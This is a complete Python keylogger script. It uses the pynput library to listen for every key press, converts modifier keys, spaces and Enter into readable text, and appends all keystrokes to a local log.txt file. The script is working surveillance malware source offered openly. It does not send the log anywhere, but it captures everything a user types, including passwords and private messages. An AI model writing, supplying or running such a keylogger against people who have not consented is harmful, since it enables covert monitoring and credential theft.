#!/usr/bin/env python3

"""Python Keylogger.

Store the keystrokes of the user into a text file.
"""

from pynput.keyboard import Listener, Key


def write_to_file(key):
    """Write to log file."""

    key_data = str(key).replace("'", "")

    if key in (Key.shift, Key.shift_l, Key.shift_r,):
        key_data = ' Shift + '
    if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r,):
        key_data = ' Ctrl + '
    if key in (Key.cmd, Key.cmd_l, Key.cmd_r,):
        key_data = ' Command + '
    if key in (Key.space,):
        key_data = ' '
    if key in (Key.enter,):
        key_data = '\n'
    try:
        with open("log.txt", "a") as fout:
            fout.write(key_data)
    except FileNotFoundError:
        with open("log.txt", "w") as fout:
            fout.write(key_data)


def main():
    """Start the listener to log keystrokes."""
    with Listener(on_press=write_to_file) as listener:
        listener.join()


if __name__ == "__main__":
    main()
